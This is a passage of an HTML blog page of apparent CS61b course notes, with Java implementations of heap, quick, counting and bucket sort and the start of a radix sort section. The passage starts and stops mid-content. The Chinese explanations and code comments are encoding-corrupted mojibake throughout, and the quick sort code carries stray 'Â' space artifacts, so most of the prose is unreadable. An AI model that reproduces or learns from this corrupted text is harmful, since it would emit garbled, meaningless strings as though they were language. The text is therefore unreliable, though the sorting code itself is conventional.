class="hljs-keyword">if</span> (left[<span class="hljs-number">0</span>] &lt;= right[<span class="hljs-number">0</span>]) &#123;<br>                result[i++] = left[<span class="hljs-number">0</span>];<br>                left = Arrays.copyOfRange(left, <span class="hljs-number">1</span>, left.length);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                result[i++] = right[<span class="hljs-number">0</span>];<br>                right = Arrays.copyOfRange(right, <span class="hljs-number">1</span>, right.length);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">while</span> (left.length &gt; <span class="hljs-number">0</span>) &#123;<br>            result[i++] = left[<span class="hljs-number">0</span>];<br>            left = Arrays.copyOfRange(left, <span class="hljs-number">1</span>, left.length);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span> (right.length &gt; <span class="hljs-number">0</span>) &#123;<br>            result[i++] = right[<span class="hljs-number">0</span>];<br>            right = Arrays.copyOfRange(right, <span class="hljs-number">1</span>, right.length);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Heap-Sort"><a href="#Heap-Sort" class="headerlink" title="Heap Sort"></a>Heap Sort</h2><p>å †æ’åºï¼ˆHeapsortï¼‰æ˜¯æŒ‡åˆ©ç”¨å †è¿™ç§æ•°æ®ç»“æ„æ‰€è®¾è®¡çš„ä¸€ç§æ’åºç®—æ³•ã€‚å †ç§¯æ˜¯ä¸€ä¸ªè¿‘ä¼¼å®Œå…¨äºŒå‰æ ‘çš„ç»“æ„ï¼Œå¹¶åŒæ—¶æ»¡è¶³å †ç§¯çš„æ€§è´¨ï¼šå³å­ç»“ç‚¹çš„é”®å€¼æˆ–ç´¢å¼•æ€»æ˜¯å°äºï¼ˆæˆ–è€…å¤§äºï¼‰å®ƒçš„çˆ¶èŠ‚ç‚¹ã€‚å †æ’åºå¯ä»¥è¯´æ˜¯ä¸€ç§åˆ©ç”¨å †çš„æ¦‚å¿µæ¥æ’åºçš„é€‰æ‹©æ’åºã€‚åˆ†ä¸ºä¸¤ç§æ–¹æ³•ï¼š</p><ol><li>å¤§é¡¶å †ï¼šæ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½å¤§äºæˆ–ç­‰äºå…¶å­èŠ‚ç‚¹çš„å€¼ï¼Œåœ¨å †æ’åºç®—æ³•ä¸­ç”¨äºå‡åºæ’åˆ—ï¼›</li><li>å°é¡¶å †ï¼šæ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½å°äºæˆ–ç­‰äºå…¶å­èŠ‚ç‚¹çš„å€¼ï¼Œåœ¨å †æ’åºç®—æ³•ä¸­ç”¨äºé™åºæ’åˆ—ï¼›<br>å †æ’åºçš„å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º ÎŸ(nlogn)ã€‚</li></ol><p><img src="/Pictures/CS61b/02/heapSort.gif" alt="heapSort"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapSort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> arr.length;<br><br>        <span class="hljs-comment">// æ„å»ºæœ€å¤§å †ï¼ˆHeapifyï¼‰</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> n / <span class="hljs-number">2</span> - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            heapify(arr, n, i);<br>        &#125;<br><br>        <span class="hljs-comment">// é€ä¸ªä»å †é¡¶å–å‡ºå…ƒç´ å¹¶è¿›è¡Œå †è°ƒæ•´</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> n - <span class="hljs-number">1</span>; i &gt; <span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-comment">// å°†å½“å‰å †é¡¶å…ƒç´ ï¼ˆæœ€å¤§å…ƒç´ ï¼‰ä¸æœªæ’åºéƒ¨åˆ†çš„æœ€åä¸€ä¸ªå…ƒç´ äº¤æ¢</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>];<br>            arr[<span class="hljs-number">0</span>] = arr[i];<br>            arr[i] = temp;<br><br>            <span class="hljs-comment">// å¯¹äº¤æ¢åçš„å †é¡¶å…ƒç´ è¿›è¡Œå †è°ƒæ•´</span><br>            heapify(arr, i, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// å †è°ƒæ•´</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr, <span class="hljs-type">int</span> n, <span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">largest</span> <span class="hljs-operator">=</span> i; <span class="hljs-comment">// åˆå§‹åŒ–æœ€å¤§å€¼ç´¢å¼•ä¸ºå½“å‰èŠ‚ç‚¹</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">left</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>; <span class="hljs-comment">// å·¦å­èŠ‚ç‚¹ç´¢å¼•</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">right</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> * i + <span class="hljs-number">2</span>; <span class="hljs-comment">// å³å­èŠ‚ç‚¹ç´¢å¼•</span><br><br>        <span class="hljs-comment">// æ‰¾å‡ºå½“å‰èŠ‚ç‚¹ã€å·¦å­èŠ‚ç‚¹å’Œå³å­èŠ‚ç‚¹ä¸­çš„æœ€å¤§å€¼ç´¢å¼•</span><br>        <span class="hljs-keyword">if</span> (left &lt; n &amp;&amp; arr[left] &gt; arr[largest]) &#123;<br>            largest = left;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (right &lt; n &amp;&amp; arr[right] &gt; arr[largest]) &#123;<br>            largest = right;<br>        &#125;<br><br>        <span class="hljs-comment">// å¦‚æœæœ€å¤§å€¼ç´¢å¼•ä¸æ˜¯å½“å‰èŠ‚ç‚¹ï¼Œåˆ™äº¤æ¢å½“å‰èŠ‚ç‚¹ä¸æœ€å¤§å€¼èŠ‚ç‚¹ï¼Œå¹¶é€’å½’è°ƒæ•´å­å †</span><br>        <span class="hljs-keyword">if</span> (largest != i) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> arr[i];<br>            arr[i] = arr[largest];<br>            arr[largest] = temp;<br>            <span class="hljs-comment">// é€’å½’è°ƒæ•´å­å †</span><br>            heapify(arr, n, largest);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Quick-Sort"><a href="#Quick-Sort" class="headerlink" title="Quick Sort"></a>Quick Sort</h2><p>å¿«é€Ÿæ’åºæ˜¯ç”±ä¸œå°¼Â·éœå°”æ‰€å‘å±•çš„ä¸€ç§æ’åºç®—æ³•ã€‚åœ¨å¹³å‡çŠ¶å†µä¸‹ï¼Œæ’åº n ä¸ªé¡¹ç›®è¦ ÎŸ(nlogn) æ¬¡æ¯”è¾ƒã€‚åœ¨æœ€åçŠ¶å†µä¸‹åˆ™éœ€è¦ ÎŸ(n2) æ¬¡æ¯”è¾ƒï¼Œä½†è¿™ç§çŠ¶å†µå¹¶ä¸å¸¸è§ã€‚äº‹å®ä¸Šï¼Œå¿«é€Ÿæ’åºé€šå¸¸æ˜æ˜¾æ¯”å…¶ä»– ÎŸ(nlogn) ç®—æ³•æ›´å¿«ï¼Œå› ä¸ºå®ƒçš„å†…éƒ¨å¾ªç¯ï¼ˆinner loopï¼‰å¯ä»¥åœ¨å¤§éƒ¨åˆ†çš„æ¶æ„ä¸Šå¾ˆæœ‰æ•ˆç‡åœ°è¢«å®ç°å‡ºæ¥ã€‚</p><p>å¿«é€Ÿæ’åºä½¿ç”¨åˆ†æ²»æ³•ï¼ˆDivide and conquerï¼‰ç­–ç•¥æ¥æŠŠä¸€ä¸ªä¸²è¡Œï¼ˆlistï¼‰åˆ†ä¸ºä¸¤ä¸ªå­ä¸²è¡Œï¼ˆsub-listsï¼‰ã€‚</p><p>å¿«é€Ÿæ’åºåˆæ˜¯ä¸€ç§åˆ†è€Œæ²»ä¹‹æ€æƒ³åœ¨æ’åºç®—æ³•ä¸Šçš„å…¸å‹åº”ç”¨ã€‚æœ¬è´¨ä¸Šæ¥çœ‹ï¼Œå¿«é€Ÿæ’åºåº”è¯¥ç®—æ˜¯åœ¨å†’æ³¡æ’åºåŸºç¡€ä¸Šçš„é€’å½’åˆ†æ²»æ³•ã€‚</p><p>ç®—æ³•æ­¥éª¤ï¼š</p><ol><li><p>ä»æ•°åˆ—ä¸­æŒ‘å‡ºä¸€ä¸ªå…ƒç´ ï¼Œç§°ä¸º â€œåŸºå‡†â€ï¼ˆpivotï¼‰;</p></li><li><p>é‡æ–°æ’åºæ•°åˆ—ï¼Œæ‰€æœ‰å…ƒç´ æ¯”åŸºå‡†å€¼å°çš„æ‘†æ”¾åœ¨åŸºå‡†å‰é¢ï¼Œæ‰€æœ‰å…ƒç´ æ¯”åŸºå‡†å€¼å¤§çš„æ‘†åœ¨åŸºå‡†çš„åé¢ï¼ˆç›¸åŒçš„æ•°å¯ä»¥åˆ°ä»»ä¸€è¾¹ï¼‰ã€‚åœ¨è¿™ä¸ªåˆ†åŒºé€€å‡ºä¹‹åï¼Œè¯¥åŸºå‡†å°±å¤„äºæ•°åˆ—çš„ä¸­é—´ä½ç½®ã€‚è¿™ä¸ªç§°ä¸ºåˆ†åŒºï¼ˆpartitionï¼‰æ“ä½œï¼›</p></li><li><p>é€’å½’åœ°ï¼ˆrecursiveï¼‰æŠŠå°äºåŸºå‡†å€¼å…ƒç´ çš„å­æ•°åˆ—å’Œå¤§äºåŸºå‡†å€¼å…ƒç´ çš„å­æ•°åˆ—æ’åºï¼›</p></li></ol><p><img src="/Pictures/CS61b/02/quickSort.gif" alt="quickSort"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>Â  Â  <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[] quickSort(<span class="hljs-type">int</span>[] arr, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right) &#123;<br>Â  Â  Â  Â  <span class="hljs-keyword">if</span> (left &lt; right) &#123;<br>Â  Â  Â  Â  Â  Â  <span class="hljs-type">int</span> <span class="hljs-variable">partitionIndex</span> <span class="hljs-operator">=</span> partition(arr, left, right);<br>Â  Â  Â  Â  Â  Â  quickSort(arr, left, partitionIndex - <span class="hljs-number">1</span>);<br>Â  Â  Â  Â  Â  Â  quickSort(arr, partitionIndex + <span class="hljs-number">1</span>, right);<br>Â  Â  Â  Â  &#125;<br>Â  Â  Â  Â  <span class="hljs-keyword">return</span> arr;<br>Â  Â  &#125;<br><br>Â  Â  <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">partition</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> &#123;<br>Â  Â  Â  Â  <span class="hljs-comment">// è®¾å®šåŸºå‡†å€¼ï¼ˆpivotï¼‰</span><br>Â  Â  Â  Â  <span class="hljs-type">int</span> <span class="hljs-variable">pivot</span> <span class="hljs-operator">=</span> left;<br>Â  Â  Â  Â  <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> pivot + <span class="hljs-number">1</span>;<br>Â  Â  Â  Â  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> index; i &lt;= right; i++) &#123;<br>Â  Â  Â  Â  Â  Â  <span class="hljs-keyword">if</span> (arr[i] &lt; arr[pivot]) &#123;<br>Â  Â  Â  Â  Â  Â  Â  Â  swap(arr, i, index);<br>Â  Â  Â  Â  Â  Â  Â  Â  index++;<br>Â  Â  Â  Â  Â  Â  &#125;<br>Â  Â  Â  Â  &#125;<br>Â  Â  Â  Â  swap(arr, pivot, index - <span class="hljs-number">1</span>);<br>Â  Â  Â  Â  <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span>;<br>Â  Â  &#125;<br><br>Â  Â  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> &#123;<br>Â  Â  Â  Â  <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> arr[i];<br>Â  Â  Â  Â  arr[i] = arr[j];<br>Â  Â  Â  Â  arr[j] = temp;<br>Â  Â  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Counting-sort"><a href="#Counting-sort" class="headerlink" title="Counting sort"></a>Counting sort</h2><p>è®¡æ•°æ’åºï¼ˆCounting Sortï¼‰æ˜¯ä¸€ç§éæ¯”è¾ƒå‹çš„æ•´æ•°æ’åºç®—æ³•ï¼Œå®ƒåˆ©ç”¨è¾“å…¥æ•°æ®çš„ç‰¹å®šèŒƒå›´è¿›è¡Œæ’åºã€‚è®¡æ•°æ’åºçš„åŸºæœ¬æ€æƒ³æ˜¯ç»Ÿè®¡æ¯ä¸ªè¾“å…¥å…ƒç´ çš„å‡ºç°æ¬¡æ•°ï¼Œç„¶åæ ¹æ®å…ƒç´ çš„å€¼å’Œå‡ºç°æ¬¡æ•°ï¼Œå°†å…ƒç´ æ”¾ç½®åˆ°æ­£ç¡®çš„ä½ç½®ä¸Šã€‚</p><p>ä»¥ä¸€ä¸ªä¾‹å­è¯´æ˜ï¼š<br>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå¾…æ’åºçš„æ•´æ•°æ•°ç»„ <code>[4, 2, 2, 8, 3, 3, 1]</code>ã€‚</p><ol><li><p>ç¡®å®šè¾“å…¥æ•°æ®çš„èŒƒå›´ï¼ˆæœ€å¤§å€¼å’Œæœ€å°å€¼ï¼‰ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæœ€å¤§å€¼æ˜¯ 8ï¼Œæœ€å°å€¼æ˜¯ 1ã€‚</p></li><li><p>åˆ›å»ºè®¡æ•°æ•°ç»„ï¼Œå¹¶ç»Ÿè®¡æ¯ä¸ªå…ƒç´ çš„å‡ºç°æ¬¡æ•°ã€‚</p><table><thead><tr><th>å…ƒç´ </th><th>å‡ºç°æ¬¡æ•°</th></tr></thead><tbody><tr><td>1</td><td>1</td></tr><tr><td>2</td><td>2</td></tr><tr><td>3</td><td>2</td></tr><tr><td>4</td><td>1</td></tr><tr><td>5</td><td>0</td></tr><tr><td>6</td><td>0</td></tr><tr><td>7</td><td>0</td></tr><tr><td>8</td><td>1</td></tr></tbody></table></li><li><p>å°†è®¡æ•°æ•°ç»„è½¬æ¢ä¸ºæ¯ä¸ªå…ƒç´ åœ¨è¾“å‡ºæ•°ç»„ä¸­çš„èµ·å§‹ä½ç½®ã€‚</p><table><thead><tr><th>å…ƒç´ </th><th>å‡ºç°æ¬¡æ•°</th><th>èµ·å§‹ä½ç½®</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>0</td></tr><tr><td>2</td><td>2</td><td>1</td></tr><tr><td>3</td><td>2</td><td>3</td></tr><tr><td>4</td><td>1</td><td>5</td></tr><tr><td>5</td><td>0</td><td>6</td></tr><tr><td>6</td><td>0</td><td>6</td></tr><tr><td>7</td><td>0</td><td>6</td></tr><tr><td>8</td><td>1</td><td>7</td></tr></tbody></table></li><li><p>åˆ›å»ºè¾“å‡ºæ•°ç»„ï¼Œå¹¶å°†å¾…æ’åºæ•°ç»„ä¸­çš„å…ƒç´ æ”¾ç½®åˆ°è¾“å‡ºæ•°ç»„çš„æ­£ç¡®ä½ç½®ä¸Šã€‚</p><ul><li>ä»å¾…æ’åºæ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ å¼€å§‹éå†ï¼Œå³ <code>arr = [4, 2, 2, 8, 3, 3, 1]</code>ã€‚</li><li>å½“å‰å…ƒç´ æ˜¯ 1ï¼Œåœ¨è®¡æ•°æ•°ç»„ä¸­çš„èµ·å§‹ä½ç½®æ˜¯ 0ï¼Œå› æ­¤æ”¾ç½®åˆ°è¾“å‡ºæ•°ç»„çš„ç´¢å¼•ä½ç½®ä¸º 0ã€‚</li><li>å½“å‰å…ƒç´ æ˜¯ 3ï¼Œåœ¨è®¡æ•°æ•°ç»„ä¸­çš„èµ·å§‹ä½ç½®æ˜¯ 3ï¼Œå› æ­¤æ”¾ç½®åˆ°è¾“å‡ºæ•°ç»„çš„ç´¢å¼•ä½ç½®ä¸º 3ã€‚</li><li>å½“å‰å…ƒç´ æ˜¯ 3ï¼Œåœ¨è®¡æ•°æ•°ç»„ä¸­çš„èµ·å§‹ä½ç½®æ˜¯ 3ï¼Œå› æ­¤æ”¾ç½®åˆ°è¾“å‡ºæ•°ç»„çš„ç´¢å¼•ä½ç½®ä¸º 4ã€‚</li><li>ä¾æ­¤ç±»æ¨ï¼Œå°†æ‰€æœ‰å…ƒç´ æ”¾ç½®åˆ°è¾“å‡ºæ•°ç»„çš„æ­£ç¡®ä½ç½®ä¸Šã€‚</li></ul></li><li><p>è¾“å‡ºæ•°ç»„å³ä¸ºæ’åºåçš„ç»“æœã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ’åºåçš„æ•°ç»„æ˜¯ <code>[1, 2, 2, 3, 3, 4, 8]</code>ã€‚</p></li></ol><p><img src="/Pictures/CS61b/02/countingSort.gif" alt="countingSort"></p><p>ç®—æ³•å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>     <span class="hljs-keyword">private</span> <span class="hljs-type">int</span>[] countingSort(<span class="hljs-type">int</span>[] arr, <span class="hljs-type">int</span> maxValue) &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">bucketLen</span> <span class="hljs-operator">=</span> maxValue + <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span>[] bucket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[bucketLen];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : arr) &#123;<br>            bucket[value]++;<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">sortedIndex</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; bucketLen; j++) &#123;<br>            <span class="hljs-keyword">while</span> (bucket[j] &gt; <span class="hljs-number">0</span>) &#123;<br>                arr[sortedIndex++] = j;<br>                bucket[j]--;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> arr;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getMaxValue</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">maxValue</span> <span class="hljs-operator">=</span> arr[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> value : arr) &#123;<br>            <span class="hljs-keyword">if</span> (maxValue &lt; value) &#123;<br>                maxValue = value;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxValue;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Bucket-Sort"><a href="#Bucket-Sort" class="headerlink" title="Bucket Sort"></a>Bucket Sort</h2><p>æ¡¶æ’åºæ˜¯è®¡æ•°æ’åºçš„å‡çº§ç‰ˆã€‚å®ƒåˆ©ç”¨äº†å‡½æ•°çš„æ˜ å°„å…³ç³»ï¼Œé«˜æ•ˆä¸å¦çš„å…³é”®å°±åœ¨äºè¿™ä¸ªæ˜ å°„å‡½æ•°çš„ç¡®å®šã€‚ä¸ºäº†ä½¿æ¡¶æ’åºæ›´åŠ é«˜æ•ˆï¼Œæˆ‘ä»¬éœ€è¦åšåˆ°è¿™ä¸¤ç‚¹ï¼š</p><ol><li>åœ¨é¢å¤–ç©ºé—´å……è¶³çš„æƒ…å†µä¸‹ï¼Œå°½é‡å¢å¤§æ¡¶çš„æ•°é‡</li><li>ä½¿ç”¨çš„æ˜ å°„å‡½æ•°èƒ½å¤Ÿå°†è¾“å…¥çš„ N ä¸ªæ•°æ®å‡åŒ€çš„åˆ†é…åˆ° K ä¸ªæ¡¶ä¸­<br>åŒæ—¶ï¼Œå¯¹äºæ¡¶ä¸­å…ƒç´ çš„æ’åºï¼Œé€‰æ‹©ä½•ç§æ¯”è¾ƒæ’åºç®—æ³•å¯¹äºæ€§èƒ½çš„å½±å“è‡³å…³é‡è¦ã€‚</li></ol><p><img src="/Pictures/CS61b/02/Bucket_sort_1.svg_.png" alt="bucketSort"><br><img src="/Pictures/CS61b/02/Bucket_sort_2.svg_.png" alt="bucketSort"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bucketSort</span><span class="hljs-params">(<span class="hljs-type">double</span>[] arr)</span> &#123;<br>        <span class="hljs-keyword">if</span> (arr == <span class="hljs-literal">null</span> || arr.length &lt;= <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> arr.length;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">numOfBuckets</span> <span class="hljs-operator">=</span> n; <span class="hljs-comment">// è®¾ç½®æ¡¶çš„æ•°é‡ä¸ºå¾…æ’åºæ•°ç»„çš„é•¿åº¦</span><br>        ArrayList&lt;Double&gt;[] buckets = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>[numOfBuckets];<br><br>        <span class="hljs-comment">// åˆå§‹åŒ–æ¯ä¸ªæ¡¶</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; numOfBuckets; i++) &#123;<br>            buckets[i] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        &#125;<br><br>        <span class="hljs-comment">// å°†å…ƒç´ æ”¾å…¥å¯¹åº”çš„æ¡¶ä¸­</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">double</span> num : arr) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">bucketIndex</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (num * numOfBuckets);<br>            buckets[bucketIndex].add(num);<br>        &#125;<br><br>        <span class="hljs-comment">// å¯¹æ¯ä¸ªæ¡¶ä¸­çš„å…ƒç´ è¿›è¡Œæ’åº</span><br>        <span class="hljs-keyword">for</span> (ArrayList&lt;Double&gt; bucket : buckets) &#123;<br>            Collections.sort(bucket);<br>        &#125;<br><br>        <span class="hljs-comment">// å°†æ’åºåçš„å…ƒç´ ä¾æ¬¡æ”¾å›åŸæ•°ç»„</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (ArrayList&lt;Double&gt; bucket : buckets) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">double</span> num : bucket) &#123;<br>                arr[index++] = num;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="LSD-Radix-Sort"><a href="#LSD-Radix-Sort" class="headerlink" title="LSD Radix Sort"></a>LSD Radix Sort</h2><p>åŸºæ•°æ’åºæ˜¯ä¸€ç§éæ¯”è¾ƒå‹æ•´æ•°æ’åºç®—æ³•ï¼Œå…¶åŸç†æ˜¯å°†æ•´æ•°æŒ‰ä½æ•°åˆ‡å‰²æˆä¸åŒçš„æ•°å­—ï¼Œç„¶åæŒ‰æ¯ä¸ªä½æ•°åˆ†åˆ«æ¯”è¾ƒã€‚ç”±äºæ•´æ•°ä¹Ÿå¯ä»¥è¡¨è¾¾å­—ç¬¦ä¸²ï¼ˆæ¯”å¦‚åå­—æˆ–æ—¥æœŸï¼‰å’Œç‰¹å®šæ ¼å¼çš„æµ®ç‚¹æ•°ï¼Œæ‰€ä»¥åŸºæ•°æ’åºä¹Ÿä¸æ˜¯åªèƒ½ä½¿ç”¨äºæ•´æ•°ã€‚</p><p>LSD åŸºæ•°æ’åºçš„åŸºæœ¬æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>ç¡®å®šå…³é”®å­—çš„ä½æ•°ï¼ˆå³æ•°å­—çš„æœ€å¤§ä½æ•°ï¼‰ã€‚</li><li>ä»æœ€ä½æœ‰æ•ˆä½ï¼ˆæœ€å³è¾¹çš„ä½ï¼‰å¼€å§‹ï¼ŒæŒ‰ç…§å½“å‰ä½çš„å€¼è¿›è¡Œç¨³å®šæ’åºã€‚</li><li>é‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œç›´åˆ°å¯¹æ‰€æœ‰ä½è¿›è¡Œäº†æ’åºã€‚</li></ol><p>è¿™ä¸‰ç§æ’åºç®—æ³•éƒ½åˆ©ç”¨äº†æ¡¶çš„æ¦‚å¿µï¼Œä½†å¯¹æ¡¶çš„ä½¿ç”¨æ–¹æ³•ä¸Šæœ‰æ˜æ˜¾å·®å¼‚ï¼š</p><ul><li>åŸºæ•°æ’åºï¼šæ 